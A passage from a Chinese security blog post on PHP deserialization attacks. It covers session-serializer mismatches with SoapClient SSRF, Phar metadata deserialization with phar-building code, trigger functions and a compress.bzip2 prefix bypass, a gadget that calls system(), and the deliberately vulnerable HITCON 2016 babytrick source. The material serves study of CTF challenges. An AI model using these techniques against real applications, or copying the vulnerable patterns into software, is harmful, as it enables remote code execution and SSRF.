<p>&#x4E3A;&#x4E86;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x53EA;&#x80FD;&#x5229;&#x7528;PHP&#x4E2D;SESSION&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x673A;&#x5236;&#x3002;&#x4E3B;&#x8981;&#x4F53;&#x73B0;&#x5728;&#x5DEE;&#x5F02;&#x6027;(&#x5F53;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5F15;&#x64CE;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5F15;&#x64CE;&#x4E0D;&#x4E00;&#x81F4;&#x65F6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5F15;&#x64CE;&#x4E4B;&#x95F4;&#x7684;&#x5DEE;&#x5F02;&#x4EA7;&#x751F;&#x5E8F;&#x5217;&#x5316;&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;)&#x3002;&#x4F46;&#x662F;&#x5728;PHP&#x4E2D;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x7684;&#x662F;PHP&#x5F15;&#x64CE;&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x4E3A;&#x4E86;&#x5C55;&#x73B0;session&#x7684;&#x5DEE;&#x5F02;&#x6027;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x4EE3;&#x7801;&#x624B;&#x52A8;&#x6784;&#x9020;&#x5DEE;&#x5F02;&#x6027;&#x3002;</p>
<p>&#x901A;&#x8FC7; <code>call_user_func($_GET[&apos;f&apos;], $_POST);</code> &#x6784;&#x9020;PHP&#x5F15;&#x64CE;&#x5DEE;&#x5F02;&#x6027;&#x3002;&#x5E76;&#x901A;&#x8FC7; <code>$_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];</code> &#x5C06;&#x6784;&#x9020;&#x7684;Soap&#x7C7B;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x5199;&#x5165;session&#x6587;&#x4EF6;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201704046.png" alt="image-20201113201704046"></p>
<p>&#x4E3A;&#x4E86;&#x8C03;&#x7528; <code>__call</code> &#x65B9;&#x6CD5;&#x3002;&#x9996;&#x5148;&#x5229;&#x7528;<code>call_user_func($_GET[&apos;f&apos;], $_POST);</code>&#x4F20;&#x5165; <code>f=extract</code> &#x8FDB;&#x884C;POST&#x53D8;&#x91CF;&#x8986;&#x76D6;&#x3002;&#x968F;&#x540E;&#x901A;&#x8FC7;GET&#x4F20;&#x53C2;&#x4EE4;<code>$_SESSION[&apos;name&apos;] = SoapClient</code>&#x3002;&#x518D;&#x5229;&#x7528;POST&#x4F20;&#x53C2;&#x8FDB;&#x884C;&#x53D8;&#x91CF;b&#x7684;&#x8986;&#x76D6;&#x3002;&#x5373;&#x8C03;&#x7528; SoapClient &#x7C7B;&#x4E0D;&#x5B58;&#x5728;&#x7684; <code>welcome_to_the_lctf2018</code> &#x65B9;&#x6CD5;&#xFF0C;&#x4ECE;&#x800C;&#x89E6;&#x53D1; <code>__call</code> &#x65B9;&#x6CD5;&#x53D1;&#x8D77; soap &#x8BF7;&#x6C42;&#x8FDB;&#x884C; SSRF &#x3002;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201738749.png" alt></p>
<p>&#x6700;&#x540E;&#x643A;&#x5E26;cookie&#x8BBF;&#x95EE;</p>
<h2 id="Phar&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x9762;"><a href="#Phar&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x9762;" class="headerlink" title="Phar&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x9762;"></a>Phar&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x9762;</h2><h3 id="Phar&#x7B80;&#x4ECB;"><a href="#Phar&#x7B80;&#x4ECB;" class="headerlink" title="Phar&#x7B80;&#x4ECB;"></a>Phar&#x7B80;&#x4ECB;</h3><p>&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x9762;&#x4F53;&#x73B0;&#x5728;: &#x53EF;&#x901A;&#x8FC7;&#x6784;&#x9020; phar &#x5728;&#x6CA1;&#x6709; <code>unserailize()</code> &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5B9E;&#x73B0;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x653B;&#x51FB;</p>
<p><a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">&#x7531; PHPGGC &#x7406;&#x89E3; PHP &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;</a> &#x4E00;&#x6587;&#x4E2D;&#x5BF9;&#x5176;&#x6982;&#x5FF5;&#x6982;&#x62EC;&#x5341;&#x5206;&#x7B80;&#x6D01;&#x660E;&#x4E86;</p>
<blockquote>
<p>&#x7B80;&#x5355;&#x6765;&#x8BF4;phar&#x5C31;&#x662F;php&#x538B;&#x7F29;&#x6587;&#x6863;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x628A;&#x591A;&#x4E2A;&#x6587;&#x4EF6;&#x5F52;&#x6863;&#x5230;&#x540C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x7ECF;&#x8FC7;&#x89E3;&#x538B;&#x5C31;&#x80FD;&#x88AB; php &#x8BBF;&#x95EE;&#x5E76;&#x6267;&#x884C;&#xFF0C;&#x4E0E;<code>file://</code> &#xFF0C;<code>php://</code>&#x7B49;&#x7C7B;&#x4F3C;&#xFF0C;&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x6D41;&#x5305;&#x88C5;&#x5668;&#x3002;</p>
</blockquote>
<blockquote>
<p>phar&#x7ED3;&#x6784;&#x7531; 4 &#x90E8;&#x5206;&#x7EC4;&#x6210;</p>
<ol>
<li><code>stub</code> phar &#x6587;&#x4EF6;&#x6807;&#x8BC6;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A; <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;&#xFF1B;</code></li>
<li><code>manifest</code> &#x538B;&#x7F29;&#x6587;&#x4EF6;&#x7684;&#x5C5E;&#x6027;&#x7B49;&#x4FE1;&#x606F;&#xFF0C;&#x4EE5;&#x5E8F;&#x5217;&#x5316;&#x5B58;&#x50A8;&#xFF1B;</li>
<li><code>contents</code> &#x538B;&#x7F29;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#xFF1B;</li>
<li><code>signature</code> &#x7B7E;&#x540D;&#xFF0C;&#x653E;&#x5728;&#x6587;&#x4EF6;&#x672B;&#x5C3E;&#xFF1B;</li>
</ol>
</blockquote>
<blockquote>
<p>&#x8FD9;&#x91CC;&#x6709;&#x4E24;&#x4E2A;&#x5173;&#x952E;&#x70B9;&#xFF0C;&#x4E00;&#x662F;&#x6587;&#x4EF6;&#x6807;&#x8BC6;&#xFF0C;&#x5FC5;&#x987B;&#x4EE5;<code>__HALT_COMPILER();?&gt;</code>&#x7ED3;&#x5C3E;&#xFF0C;&#x4F46;&#x524D;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x6CA1;&#x6709;&#x9650;&#x5236;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8F7B;&#x6613;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#x6587;&#x4EF6;&#x6216;&#x8005;pdf&#x6587;&#x4EF6;&#x6765;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B;&#x4E0A;&#x4F20;&#x9650;&#x5236;&#xFF1B;&#x4E8C;&#x662F;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;phar&#x5B58;&#x50A8;&#x7684;meta-data&#x4FE1;&#x606F;&#x4EE5;&#x5E8F;&#x5217;&#x5316;&#x65B9;&#x5F0F;&#x5B58;&#x50A8;&#xFF0C;&#x5F53;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#x901A;&#x8FC7;<code>phar://</code>&#x4F2A;&#x534F;&#x8BAE;&#x89E3;&#x6790;phar&#x6587;&#x4EF6;&#x65F6;&#x5C31;&#x4F1A;&#x5C06;&#x6570;&#x636E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x800C;&#x8FD9;&#x6837;&#x7684;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#x6709;&#x5F88;&#x591A;&#x3002;</p>
</blockquote>
<p>&#x5229;&#x7528;&#x6761;&#x4EF6;:</p>
<ol>
<li>phar&#x6587;&#x4EF6;&#x8981;&#x80FD;&#x591F;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x3002;</li>
<li>&#x8981;&#x6709;&#x53EF;&#x7528;&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4F5C;&#x4E3A;&#x201C;&#x8DF3;&#x677F;&#x201D;&#x3002;</li>
<li>&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#xFF0C;&#x4E14;<code>:</code>&#x3001;<code>/</code>&#x3001;<code>phar</code>&#x7B49;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x6CA1;&#x6709;&#x88AB;&#x8FC7;&#x6EE4;&#x3002;</li>
</ol>
<p>&#x751F;&#x6210;Phar<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>{</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="hljs-string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x4E3A;phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//&#x8BBE;&#x7F6E;stub</span></span><br><span class="line">    $o = <span class="hljs-keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="hljs-comment">//&#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#x5B58;&#x5165;manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//&#x6DFB;&#x52A0;&#x8981;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6;</span></span><br><span class="line">    <span class="hljs-comment">//&#x7B7E;&#x540D;&#x81EA;&#x52A8;&#x8BA1;&#x7B97;</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<blockquote>
<p>PS: &#x8981;&#x5C06;php.ini&#x4E2D;&#x7684;<code>phar.readonly</code>&#x9009;&#x9879;&#x8BBE;&#x7F6E;&#x4E3A;Off&#xFF0C;&#x5426;&#x5219;&#x65E0;&#x6CD5;&#x751F;&#x6210;phar&#x6587;&#x4EF6;</p>
</blockquote>
<h3 id="&#x89E6;&#x53D1;&#x6761;&#x4EF6;"><a href="#&#x89E6;&#x53D1;&#x6761;&#x4EF6;" class="headerlink" title="&#x89E6;&#x53D1;&#x6761;&#x4EF6;"></a>&#x89E6;&#x53D1;&#x6761;&#x4EF6;</h3><p>@secii &#x5E08;&#x5085;&#x6587;&#x4E2D;&#x63D0;&#x5230;: php&#x4E00;&#x5927;&#x90E8;&#x5206;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x51FD;&#x6570;&#x5728;&#x901A;&#x8FC7;<code>phar://</code>&#x4F2A;&#x534F;&#x8BAE;&#x89E3;&#x6790;phar&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x90FD;&#x4F1A;&#x5C06;meta-data&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
<ul>
<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li>
<li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li>
<li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / <code>fopen</code></li>
<li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li>
<li><code>parse_ini_file</code></li>
<li><code>unlink</code></li>
<li><code>copy</code></li>
</ul>
<p>&#x968F;&#x540E; @zsx &#x5E08;&#x5085;blog&#x4E2D; <a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">Phar&#x4E0E;Stream Wrapper&#x9020;&#x6210;PHP RCE&#x7684;&#x6DF1;&#x5165;&#x6316;&#x6398;</a> &#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x4E86;&#x66F4;&#x6DF1;&#x5165;&#x7684;&#x6316;&#x6398;</p>
<ul>
<li>exif<ul>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
</ul>
</li>
</ul>
<ul>
<li>gd<ul>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom***</code></li>
</ul>
</li>
</ul>
<ul>
<li>hash<ul>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
</ul>
</li>
</ul>
<ul>
<li>file / url<ul>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
</ul>
</li>
</ul>
<ul>
<li>standard<ul>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstring</code></li>
</ul>
</li>
</ul>
<ul>
<li><p>zip<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$zip = <span class="hljs-keyword">new</span> ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(<span class="hljs-string">&apos;c.zip&apos;</span>);</span><br><span class="line">$zip-&gt;extractTo(<span class="hljs-string">&apos;phar://test.phar/test&apos;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
<li><p>Bzip / Gzip<br>&#x5982;&#x679C;&#x9650;&#x5236;&#x4E86;<code>phar://</code>&#x4E0D;&#x80FD;&#x51FA;&#x73B0;&#x5728;&#x5934;&#x51E0;&#x4E2A;&#x5B57;&#x7B26;&#x3002;&#x53EF;&#x7528; <code>compress.bzip2://</code> &#x548C; <code>compress.zlib://</code> &#x6DFB;&#x52A0;&#x81F3; <code>phar://</code> &#x524D;&#x9762;&#x8FDB;&#x884C; bypass<br><code>$z = &apos;compress.bzip2://phar:///home/sx/test.phar/test.txt&apos;;</code></p>
</li>
<li><p>MySQL<br><code>LOAD DATA LOCAL INFILE</code>&#x4E5F;&#x4F1A;&#x89E6;&#x53D1;&#x8FD9;&#x4E2A;<code>php_stream_open_wrapper</code><br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $s = <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span> <span class="hljs-params">()</span> </span>{</span><br><span class="line">        system(<span class="hljs-keyword">$this</span>-&gt;s);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="hljs-keyword">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="hljs-string">&apos;localhost&apos;</span>, <span class="hljs-string">&apos;root&apos;</span>, <span class="hljs-string">&apos;123456&apos;</span>, <span class="hljs-string">&apos;easyweb&apos;</span>, <span class="hljs-number">3306</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="hljs-string">&apos;LOAD DATA LOCAL INFILE \&apos;phar://test.phar/test\&apos; INTO TABLE a  LINES TERMINATED BY \&apos;\r\n\&apos;  IGNORE 1 LINES;&apos;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
</ul>
<h2 id="HITCON-&#x9012;&#x8FDB;&#x53CD;&#x5E8F;&#x5217;&#x5316;"><a href="#HITCON-&#x9012;&#x8FDB;&#x53CD;&#x5E8F;&#x5217;&#x5316;" class="headerlink" title="HITCON  &#x9012;&#x8FDB;&#x53CD;&#x5E8F;&#x5217;&#x5316;"></a>HITCON  &#x9012;&#x8FDB;&#x53CD;&#x5E8F;&#x5217;&#x5316;</h2><h3 id="HITCON-2016-babytrick"><a href="#HITCON-2016-babytrick" class="headerlink" title="HITCON 2016 babytrick"></a>HITCON 2016 babytrick</h3><p>&#x7F51;&#x4E0A;&#x6CA1;&#x627E;&#x5230;&#x9898;&#x76EE;&#x590D;&#x73B0;&#x7684;docker&#x73AF;&#x5883;&#xFF0C;&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x53BB; Github &#x4E0A;&#x627E;&#x7684;&#x6E90;&#x7801;&#xFF0C;&#x5BF9;&#x9898;&#x76EE;&#x7406;&#x89E3;&#x53EF;&#x80FD;&#x6709;&#x5931;&#x504F;&#x9887;&#xFF0C;&#x656C;&#x8BF7;&#x8C05;&#x89E3;&#x3002;</p>
<p>&#x9898;&#x76EE;&#x4EE3;&#x7801;&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HITCON</span></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $method;</span><br><span class="line">    <span class="hljs-keyword">private</span> $args;</span><br><span class="line">    <span class="hljs-keyword">private</span> $conn;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($method, $args)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;args = $args;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;__conn();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">list</span>($username) = func_get_args();</span><br><span class="line">        $sql = sprintf(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&apos;%s&apos;&quot;</span>, $username);</span><br><span class="line"></span><br><span class="line">        $obj = <span class="hljs-keyword">$this</span>-&gt;__query($sql);</span><br><span class="line">        <span class="hljs-keyword">if</span> ( $obj != <span class="hljs-keyword">false</span>  ) {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__die( sprintf(<span class="hljs-string">&quot;%s is %s&quot;</span>, $obj-&gt;username, $obj-&gt;role) );</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;Nobody Nobody But You!&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">global</span> $FLAG;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">list</span>($username, $password) = func_get_args();</span><br><span class="line">        $username = strtolower(trim(mysql_escape_string($username)));</span><br><span class="line">        $password = strtolower(trim(mysql_escape_string($password)));</span><br><span class="line"></span><br><span class="line">        $sql = sprintf(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&apos;%s&apos; AND password=&apos;%s&apos;&quot;</span>, $username, $password);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> ( $username == <span class="hljs-string">&apos;orange&apos;</span> || stripos($sql, <span class="hljs-string">&apos;orange&apos;</span>) != <span class="hljs-keyword">false</span> ) {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;Orange is so shy. He do not want to see you.&quot;</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $obj = <span class="hljs-keyword">$this</span>-&gt;__query($sql);</span><br><span class="line">        <span class="hljs-keyword">if</span> ( $obj != <span class="hljs-keyword">false</span> &amp;&amp; $obj-&gt;role == <span class="hljs-string">&apos;admin&apos;</span>  ) {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;Hi, Orange! Here is your flag: &quot;</span> . $FLAG);</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;Admin only!&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">source</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__conn</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">global</span> $db_host, $db_name, $db_user, $db_pass, $DEBUG;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;conn)</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);</span><br><span class="line">        mysql_select_db($db_name, <span class="hljs-keyword">$this</span>-&gt;conn);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> ($DEBUG) {</span><br><span class="line">            $sql = <span class="hljs-string">&quot;CREATE TABLE IF NOT EXISTS users ( </span></span><br><span class="line"><span class="hljs-string">                        username VARCHAR(64), </span></span><br><span class="line"><span class="hljs-string">                        password VARCHAR(64), </span></span><br><span class="line"><span class="hljs-string">                        role VARCHAR(64)</span></span><br><span class="line"><span class="hljs-string">                    ) CHARACTER SET utf8&quot;</span>;</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__query($sql, $back=<span class="hljs-keyword">false</span>);</span><br><span class="line"></span><br><span class="line">            $sql = <span class="hljs-string">&quot;INSERT INTO users VALUES (&apos;orange&apos;, &apos;$db_pass&apos;, &apos;admin&apos;), (&apos;phddaa&apos;, &apos;ddaa&apos;, &apos;user&apos;)&quot;</span>;</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__query($sql, $back=<span class="hljs-keyword">false</span>);</span><br><span class="line">        } </span><br><span class="line"></span><br><span class="line">        mysql_query(<span class="hljs-string">&quot;SET names utf8&quot;</span>);</span><br><span class="line">        mysql_query(<span class="hljs-string">&quot;SET sql_mode = &apos;strict_all_tables&apos;&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__query</span><span class="hljs-params">($sql, $back=true)</span> </span>{</span><br><span class="line">        $result = @mysql_query($sql);</span><br><span class="line">        <span class="hljs-keyword">if</span> ($back) {</span><br><span class="line">            <span class="hljs-keyword">return</span> @mysql_fetch_object($result);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__die</span><span class="hljs-params">($msg)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;__close();</span><br><span class="line"></span><br><span class="line">        header(<span class="hljs-string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">        <span class="hljs-keyword">die</span>( json_encode( <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;msg&quot;</span>=&gt; $msg) ) );</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__close</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        mysql_close(<span class="hljs-keyword">$this</span>-&gt;conn);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;__conn();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (in_array(<span class="hljs-keyword">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;show&quot;</span>, <span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;source&quot;</span>))) {</span><br><span class="line">            @call_user_func_array(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>, <span class="hljs-keyword">$this</span>-&gt;method), <span class="hljs-keyword">$this</span>-&gt;args);</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;What do you do?&quot;</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;__close();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">$this</span>-&gt;args <span class="hljs-keyword">as</span> $k =&gt; $v) {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;data&quot;</span>])) {</span><br><span class="line">    @unserialize($_GET[<span class="hljs-string">&quot;data&quot;</span>]);    </span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    <span class="hljs-keyword">new</span> HITCON(<span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-keyword">array</span>());</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6F0F;&#x6D1E;&#x4EE3;&#x7801;&#x6838;&#x5FC3;: <code>@unserialize($_GET[&quot;data&quot;]);</code> </p>
<p>&#x4EE3;&#x7801;&#x7684;&#x5168;&#x5C40;&#x8FC7;&#x6EE4;&#x5982;&#x4E0B;&#xFF0C;&#x4E3B;&#x8981;&#x8FC7;&#x6EE4;&#x51FD;&#x6570;&#x4E3A; <code>mysql_escape_string</code></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">function __wakeup() {</span><br><span class="line">    foreach($this-&gt;args as $k =&gt; $v) {</span><br><span class="line">        $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5173;&#x4E8E;&#x6B64;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x7684;&#x7ED5;&#x8FC7;&#x4E3A; <a href="https://paper.seebug.org/866/" target="_blank" rel="noopener">CVE-2016-7124</a></p>
<p>&#x4EE3;&#x7801;&#x4E2D;&#x53C2;&#x6570;&#x9644;&#x503C;&#x4E3B;&#x8981;&#x9760; <code>call_user_func_array()</code>,<code>list()</code>,<code>func_get_args()</code>&#x4E09;&#x4E2A;&#x51FD;&#x6570;&#x5171;&#x540C;&#x4F5C;&#x7528;&#x3002;</p>
